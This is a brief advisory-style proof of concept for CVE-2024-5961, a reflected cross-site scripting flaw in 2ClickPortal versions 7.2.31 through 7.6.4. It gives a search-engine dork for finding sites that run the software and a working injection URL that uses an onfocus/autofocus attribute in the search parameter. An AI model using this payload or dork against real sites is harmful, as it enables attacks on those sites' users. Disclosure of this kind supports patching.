# CVE-2024-5961
Reflected XSS in 2ClickPortal
Version: from 7.2.31 through 7.6.4.
`intext:"Powered by 2ClickPortal"`

## PoC

```
https://[domain]/szukaj/?search_lang=pl&search=all&string=" onfocus=alert(1) autofocus="
```
